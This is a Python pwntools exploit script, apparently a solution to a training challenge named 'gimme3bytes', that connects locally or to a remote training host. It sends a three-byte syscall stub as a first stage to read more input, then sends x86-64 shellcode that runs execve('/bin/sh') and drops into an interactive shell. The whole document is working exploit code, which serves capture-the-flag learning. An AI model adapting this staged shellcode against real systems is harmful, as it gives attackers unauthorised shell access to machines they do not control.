from pwn import *

COMMANDS = """
b * 0x4011f1
b * 0x4011e3
c
"""
context.arch = "amd64"



if args.REMOTE:
    c = remote("gimmie3bytes.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./gimme3bytes", gdbscript=COMMANDS)
    else:
        c = process("./gimme3bytes")

c.recvuntil(b">")

# first stage to invoke a read (all parameters are already set)
# and return 

shellcode = """
syscall
ret
"""
shellcode_c = asm(shellcode)
c.send(shellcode_c)

# second stage to inject a shellcode (execve /bin/sh)

shellcode = """
xor eax, eax
mov al, 0x3b
xor rsi, rsi
xor rdx, rdx
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
syscall
"""
shellcode_c = asm(shellcode)
c.send(shellcode_c)

c.interactive()
